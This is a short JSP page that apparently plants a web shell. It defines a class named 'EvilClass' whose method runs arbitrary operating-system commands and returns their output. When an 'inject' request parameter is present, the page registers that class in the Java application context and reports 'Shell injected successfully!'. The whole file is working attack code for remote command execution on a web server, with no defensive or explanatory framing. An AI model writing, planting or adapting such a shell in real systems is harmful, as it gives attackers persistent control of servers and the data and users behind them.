<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>

<%!
    public class EvilClass {
        public String exec(String cmd) {
            StringBuilder output = new StringBuilder();
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = process.getInputStream();
                int c;
                while ((c = inputStream.read()) != -1) {
                    output.append((char) c);
                }
                inputStream.close();
            } catch (IOException e) {
                output.append("Error executing command: ").append(e.getMessage());
            }
            return output.toString();
        }
    }
%>

<%
    if (request.getParameter("inject") != null) {
        application.setAttribute("EvilClass", new EvilClass());
        response.getWriter().println("Shell injected successfully!");
    }
%>